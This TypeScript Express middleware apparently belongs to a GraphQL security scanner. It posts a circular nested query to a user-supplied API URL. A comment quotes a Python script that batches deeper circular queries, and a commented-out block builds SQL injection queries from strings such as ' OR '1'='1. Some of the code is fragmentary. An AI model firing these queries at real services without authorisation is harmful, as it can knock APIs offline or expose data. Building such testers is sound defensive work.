import { Request, Response, NextFunction } from 'express';

const circularQuery = async (req: Request, res: Response, _next: NextFunction) => {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default;
  const query = `
  query {
    pastes {
        owner {
            pastes {
                owner {
                    name
                    }
                }
            }
        }
    }`;

  // To experiment with circular queries, we’ve coded a custom exploit for
  // your arsenal of hacking tools. This exploit can dynamically extend its
  // circularity by letting you specify the number of circles that should be
  // performed. The query is also capable of batching queries using arrays.
  // ARRAY_LENGTH = 5
  // FIELD_REPEAT = 10
  // query = {"query":"query {"}
  // field_1_name = 'pastes'
  // field_2_name = 'owner'
  // count = 0
  // for _ in range(FIELD_REPEAT):
  // count += 1
  // closing_braces = '} ' * FIELD_REPEAT * 2 + '}'
  // payload = "{0} {{ {1} {{ ".format(field_1_name, field_
  // 2_name)
  // query["query"] += payload
  // if count == FIELD_REPEAT:
  // query["query"] += '__typename' + closing_braces
  // --snip--
  // queries = []
  // for _ in range(ARRAY_LENGTH):
  // queries.append(query)
  // r = requests.post('http://localhost:5013/graphql', json=qu
  // eries)
  // print(r.json())

  try {
    console.log('entered scan');
    const API = req.body.API;
    console.log('using this API', API);
    const response = await fetch(API, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/graphql',
      },
      body: query,
    });
    // type DataType = {
    //   details: Record<string, any>;
    // };
    console.log('response: ', response);
    //this part is in the works- figuring how to break them up with types/might get rid of ts
    const obj: any = await response.json();
    console.log('obj: ', obj.data);

    res.sendStatus(200);
  } catch (err) {
    console.log('injectionAttack middleware', err);
    res.status(400).json('Unable to submit query. An error occurred.');
  }
};

export default circularQuery;

// import { Request, Response, NextFunction, RequestHandler } from 'express';

// type InjectionType = {
//     generateQuery: RequestHandler
//     attack: RequestHandler
// }
// interface GraphQLType {
//     name: string
//     kind:string
//     fields?: GraphQLField[]
// }
// interface GraphQLField {
//     name: string
//     args?: GraphQLArgs[]
//     type: GraphQLTypeReference
// }
// interface GraphQLArgs {
//     name: string
//     type?: GraphQLTypeReference
// }
// interface GraphQLTypeReference {
//     kind: string
//     name?: string
//     ofType?: GraphQLTypeReference
//     fields?: GraphQLField[]
// }

// export const injection: InjectionType = {
//     generateQuery: async (req: Request, res: Response, _next: NextFunction) => {
//         const schemaTypes: GraphQLType[] = res.locals.schema.data.__schema.types;

//         const SQLInputs = [
//             "OR 1=1",
//             "' OR '1'='1",
//             "--",
//             "';--",
//             "') OR ('1'='1"
//         ];

//         const generateSubFields = (type: GraphQLTypeReference): string => {
//             return type.fields ? type.fields.map(subField => subField.name).join('') : '';
//             const args = field.args?.map(arg => `${arg.name}: "${input}"`).join(', ') ?? '';
//             const subFields = field.type.ofType ? generateSubFields(field.type.ofType) : '';
//             return `${operationType} { ${field.name}(${args}) { ${subFields} } }`;
//         }
//         }

//         const generateQuery = (field : GraphQLField, input: string) => {
//             const subFields = field.type.ofType ? generateSubFields(field.type.ofType) : '';
//             return `${field.name}(${input}) { ${subFields} }`;
//         }

//         const arrOfQueries: string[] = [];

//         for (const typeName of ['queryType', 'mutationType']) {
//             const name: string | null = res.locals.schema.data.__schema[typeName]?.name; 
//             if(!name) continue;

//             const types: GraphQLType | undefined = schemaTypes.find(type => type.name === name);
//             if(!types?.fields) continue;

//             for(const field of types.fields) {
//                 for (const input of SQLInputs){
//                     const query = generateQuery(field, input);
//                     arrOfQueries.push(query);
//                 }
//             }
//         }

//         console.log(arrOfQueries)
//         res.status(200).json(arrOfQueries)
//     },
//     attack: async (req: Request, res: Response, next: NextFunction) => {

//     }
// }